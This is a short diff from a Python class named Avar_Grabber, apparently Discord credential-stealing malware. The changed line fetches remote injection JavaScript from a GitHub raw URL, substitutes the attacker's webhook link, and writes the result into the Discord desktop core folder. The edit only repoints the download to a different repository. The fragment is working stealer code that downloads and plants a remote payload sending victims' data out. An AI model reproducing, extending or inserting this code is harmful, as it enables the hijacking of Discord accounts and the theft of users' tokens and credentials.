@@ -101,7 +101,7 @@ class Avar_Grabber:
                         os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Avar"))
                     except FileNotFoundError:
                         pass
-                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
+                    f = requests.get("https://raw.githubusercontent.com/Sarahh731/Injectionn/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
                         index_file.write(f)
         for root, dirs, files in os.walk(self.roaming+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
